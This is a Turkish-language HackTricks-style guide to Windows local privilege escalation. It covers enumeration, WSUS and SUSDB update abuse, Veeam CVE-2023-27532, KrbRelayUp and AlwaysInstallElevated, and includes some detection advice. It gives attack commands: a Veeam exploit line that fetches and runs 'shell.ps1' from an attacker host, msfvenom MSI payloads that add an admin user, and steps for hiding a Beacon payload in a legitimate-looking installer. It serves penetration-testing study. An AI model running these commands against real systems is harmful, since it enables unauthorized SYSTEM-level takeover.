# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfada, temel nitelikteki çeşitli kılavuzlardan genel Windows yetki yükseltme metodolojisi bir araya getirilmiştir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamaya yönelik enumeration akışı, topluluk atölyelerinden ve kontrol listelerinden de yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Tarihî saldırı içeriğinde, Windows yetki yükseltme hakkındaki DerbyCon sunumu da yer alır.<sup>[[5]](#references)</sup>

## Başlangıç Windows Teorisi

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL'ler - DACL'ler/SACL'ler/ACE'ler

**ACL'ler - DACL'ler/SACL'ler/ACE'ler hakkında daha fazla bilgi için aşağıdaki sayfayı inceleyin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta **sistemi enumerate etmenizi**, yürütülebilir dosyaları çalıştırmanızı ve hatta **faaliyetlerinizin tespit edilmesini** önleyebilecek çeşitli unsurlar vardır. Yetki yükseltme için enumeration işlemine başlamadan önce aşağıdaki **sayfayı** **okuyup** tüm bu **savunma mekanizmalarını** **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` belleğine yama uygulayan bir zincire de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo güvenli yol denetimleri atlandığında istem olmadan High IL'ye ulaşmak için kötüye kullanılabilir. Özel UIAccess/Admin Protection atlatma iş akışına buradan göz atın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik registry yayılımı, rastgele bir SYSTEM registry yazma işlemi (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Son Windows derlemelerinde, ayrıcalıklı bir yerel NTLM authentication işleminin yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB rastgele port** LPE yolu da kullanıma sunulmuştur:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgisi enumeration

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploitleri

Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için bu [site](https://msrc.microsoft.com/update-guide/vulnerability) kullanışlıdır. Bu veritabanında 4.700’den fazla güvenlik açığı bulunur ve Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — işletim sistemi derlemesini, yüklü güncelleştirmeleri ve olası güvenlik duyurularını listeler; bir sonucun geçerli olduğunu varsaymadan önce tam ürün sürümünü ve yerine geçen güncelleştirmeleri doğrulayın.

Sürüme özgü bir yerel exploit için, işletim sistemi mimarisinin yanı sıra **çalışan işlemin mimarisini** de kontrol edin. 64 bit Windows’ta, 32 bit bir işlem [WOW64 dosya sistemi yeniden yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32 bit sistem dizinine yönlendirilirken `%windir%\Sysnative` bu işlemin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64 bit bir işlemde kullanılamaz. İşletim sistemi derlemesi veya eksik KB adayı, exploit’in kullanılabilir olduğunu kanıtlamaz; çalışan derlemeyi, yüklü ya da yerine geçen güncelleştirmeyi, işlem mimarisini ve exploit ön koşullarını ilgili sorun için yayımlanan [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit’lerin GitHub depoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory`, dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript dosyasını incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: dosya, kimlik bilgileri dâhil olmak üzere komut bağımsız değişkenlerini ve çıktısını içerebilir. Okunabilir bir transcript dosyası, yalnızca içeriği kullanılabilir, daha yüksek ayrıcalıklara sahip bir kimliği ifşa ediyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa bir ipucu sayılır.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları; yürütülen komutlar, komut çağrıları ve betiklerin bazı bölümlerini kapsayacak şekilde kaydedilir. Ancak yürütme ayrıntılarının tamamı ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için belgelerdeki "Transcript files" bölümünde yer alan talimatları izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell loglarındaki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Komut dosyasının yürütülmesine ilişkin etkinlikler ve tüm içerik kaydedilir; böylece her kod bloğu çalışırken belgelenir. Bu süreç, her etkinliğin kapsamlı bir denetim izini koruyarak adli incelemeler ve kötü amaçlı davranışların analizi için değerli bilgiler sağlar. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sunulur.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block'e ait günlük olayları, Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS uç noktası, güncelleme meta verilerinin araya alınması açısından bir inceleme ipucudur. Exploitation ayrıca istemcinin bu WSUS sunucusunu kullanmasına, saldırganın trafiği araya alıp alamamasına veya kontrol edip edememesine ve istemcinin güncelleme güveni ile yükleme ilkesine bağlıdır. Tek başına URL, kod yürütülebileceğini göstermez. [Microsoft, WSUS meta verileri için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını kontrol etmek için cmd'de aşağıdaki komutu çalıştırarak başlayın:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Şunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulun sağlandığını doğrular; ancak interception'ın, kötü amaçlı güncellemelerin kabul edilmesinin veya yükseltilmiş yetkilerle yükleme yapılmasının mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu ilke tarafından yapılandırılan belirli WSUS endpoint'i seçilmez.

Bu vulnerabilities'ı exploit etmek için [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçları kullanabilirsiniz. Bunlar, SSL kullanmayan WSUS trafiğine "fake" güncellemeler enjekte etmek için hazırlanmış MiTM exploit betikleridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Raporun tamamını burada okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu bug'ın exploit ettiği açık şudur:

> Yerel kullanıcı proxy'mizi değiştirme gücümüz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullandığından, o kullanıcının sertifika deposunu da kullanır. WSUS hostname'i için self-signed bir sertifika oluşturup bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifikada TOFU (trust-on-first-use) türü bir doğrulama uygulamak için HSTS benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyorsa ve doğru hostname'e sahipse hizmet tarafından kabul edilir.

Bu vulnerability'ı [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla exploit edebilirsiniz (araç kullanıma açıldığında).

### WSUS yöneticisi tarafından denetlenen güncellemeler

Mevcut kimliğin bir WSUS sunucusunda güncellemeleri **yayımlama ve onaylama** yetkisine sahip olduğu durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin; ardından onaylanmış güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bunu bir privilege escalation yolu olarak değerlendirmeden önce aday güncellemenin imzalandığını ve kabul edildiğini, hedef için geçerli olduğunu ve daha ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme kötüye kullanımı: `.txt`/`.esd` aracılığıyla imzasız payload'lar

Bu, HTTP WSUS bağlantısını interception etmekten farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) saklı yordamları** kullanabilecek kadar erişime sahip olmaktır. Uygulanabilecek yollardan biri, bir üst WSUS bilgisayar hesabını `SUSDB` barındıran ayrı bir MSSQL sunucusuna relay etmektir. Gerekli ön koşullar dağıtıma göre değişir; bu yüzden SQL administrator haklarına sahip olduğunuzu varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530 üzerinden LDAP, SMB veya AD CS'ye relay eden ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'yi kötüye kullanma](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS yordamlarını kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili saklı yordamlar |
| --- | --- |
| Güncelleme meta verilerini içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik özeti değerini saldırganın denetimindeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bir bilgisayar grubunu listeleme/oluşturma ve istemciyi gruba ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` değerleriyle `spDeployUpdate` |

Dosya adı, özet değerleri, boyut ve `CommandLineInstallation` handler'ı içe aktarılan meta veriler ve XML parçaları arasında birbiriyle tutarlı olmalıdır. İçerik URL'si ve hedef grup atandıktan sonra, son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS normalde rastgele, imzasız yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` dosyasındaki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin ya da geçerli bir ESD görüntüsü olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` adı verilen değiştirilmemiş bir PE, içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir ilke/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrısı WSUS'un kayıtlı içeriği getirmesini sağlar. Origin, BITS'in HTTP beklentilerini karşılamalıdır: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım, ilk `HEAD`/`GET` akışını ve byte-range isteklerini kullanır. Range desteği olmayan bir sunucu, BITS'in Range protocol header gerektirdiğini belirten WSUS senkronizasyonu `EventId=364` hatasına neden olur.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bu SQL'i yürütmek için değiştirilmiş bir MSSQL client içerir ve içerik staging'i için `BitsWebServer.py` ile birlikte gelir. Yetkili bir laboratuvarda kullanılabilecek minimal bir komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz çalıştırma ve yeniden deneme yoluyla kalıcılık

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` yolundaki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından manuel olarak seçilmesine gerek kalmadan indirilip yapılandırılan zamanlamaya göre yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback process kapandıktan hemen sonra yeniden sunuldu; bu nedenle yeniden deneme davranışı yinelenen çalıştırma yoluyla kalıcılığa dönüşebilir. İstemci bir güncelleme başarısız durumunu gösterdiği için bu yöntem gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve sağlamlaştırma için izleme noktaları

Bu zincirden sunucu ve istemci tarafında yararlanılabilecek izleme noktaları:<sup>[[39]](#references)</sup>

- `SUSDB` üzerindeki `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` çalıştırmalarını denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload'larını ve beklenmeyen ilkeler (özellikle bilgisayar hesabı olmayan hesaplar) tarafından gerçekleştirilen dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` içinde `ContentSyncAgent`, `FileVerified`, yanlış yazılmış `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulamayı uzantıya güvenmek yerine payload uzantısı ve içerik imzasıyla ilişkilendirin.
- Windows Update yüklemesinin tekrar tekrar başarısız olup yeniden denenmesini ve `.txt` veya `.esd` adları taşıyan içeriklerin PE çalıştırmasını ya da beklenmeyen alt süreç/ağ etkinliğini araştırın.
- Desteklendiği yerlerde veritabanı hizmeti için Authentication için Extended Protection'ı zorunlu kılın ve veritabanı ağına erişimi WSUS sunucusu ve yetkili yönetim sistemleriyle sınırlandırın. Özel güncelleme yordamlarındaki `EXECUTE` haklarını en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost IPC yüzeyi ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyorsa ve güncelleyici sahte bir root CA'ya ya da zayıf imza denetimlerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI gönderebilir. Genelleştirilmiş bir tekniği (Netskope stAgentSvc zincirini temel alır – CVE-2025-0309) burada görebilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinden bir temel yedekleme hizmeti kullanır. [Veeam'in duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edildiğini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut çalıştırma yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Recon**: TCP/9401'in `Veeam.Backup.Service.exe` işlemine ait olduğunu doğrulayın, ardından yüklenmiş ürünü ve yama meta verilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu verir, ancak yama durumunu tam olarak doğrulamaz.
- **Düzeltilmiş en düşük sürümler**: Veeam, ilk düzeltilmiş sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; önceki sürümler etkilenir. Dört parçalı dosya sürümü tek başına, bu aynı build numaralarındaki yamalanmamış temel build'i sonraki bir yamadan ayırt edemez. Sınır build'ini düzeltilmiş olarak nitelendirmeden önce yama tanımlayıcısını [üreticinin build geçmişi](https://www.veeam.com/kb2680) ile doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı dizine yerleştirin, ardından yerel soket üzerinden bir SYSTEM payload tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Atıf yapılan PoC, ek ön koşullar sağlandığında SYSTEM olarak komut yürütülebildiğini gösterir; üreticinin güvenlik duyurusu kimlik bilgisi ifşası sorununu açıklar.
## KrbRelayUp

Yerel bir Kerberos relay saldırısı, uygun bir COM sunucusu kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde izinlere sahip olduğunda, düşük ayrıcalıklı bir oturum açma bağlamından ayrıcalıklı bir dizin yazma işlemine geçebilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini kapsar; KrbRelayUp bu yollardan bazılarını otomatikleştirir. Bir RBCD zinciri, uygun delegation ve hedef nesne izinleri gerektirirken shadow-credential zinciri, key-credential yazma izinleri ve sertifika kimlik doğrulama yolunu destekleyen bir KDC gerektirir. Bu yollardan hiçbiri yalnızca etki alanı üyeliğinden kaynaklanmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: Bir WinRM oturumu, etkileşimli oturumdan veya yeni kimlik bilgileriyle açılan bir oturumdan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen ACL'yi incelenmesi gereken bir durum olarak değerlendirin; pasif numaralandırma COM coercion, relay kimlik doğrulaması veya dizine yazma işlemlerini tetiklememelidir. Bir makine hesabının shadow credential'ı, makine ticket'ına ve yalnızca bu hesap gerekli dizin çoğaltma izinlerine sahipse ayrı bir DCSync yoluna ulaşılmasına yol açabilir.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

**Eğer** bu 2 kayıt defteri anahtarı **etkinleştirilmişse** (değerleri **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payload'ları

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter session'ınız varsa bu technique'i **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'tan `Write-UserAddMSI` komutunu kullanarak geçerli dizinde, privileges yükseltmek için bir Windows MSI binary'si oluşturun. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişimine ihtiyacınız olacaktır):

```
Write-UserAddMSI
```

Oluşturulan binary'yi ayrıcalıkları yükseltmek için çalıştırmanız yeterlidir.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu öğreticiyi okuyun. Yalnızca **komut satırlarını çalıştırmak** istiyorsanız bir "**.bat**" dosyasını wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**
- **Visual Studio**'yu açın, **Create a new project** seçeneğini seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini seçin ve **Create**'e tıklayın.
- 4 adımlı sihirbazın 3. adımına (dahil edilecek dosyaları seçme) gelene kadar **Next**'e tıklayın. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86** yerine **x64** olarak değiştirin.
  - **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz; bu, yüklenen uygulamanın daha meşru görünmesini sağlayabilir.
- Projeye sağ tıklayın ve **View > Custom Actions** seçeneğini seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action** seçeneğini seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz Beacon payload'unun çalıştırılması sağlanır.
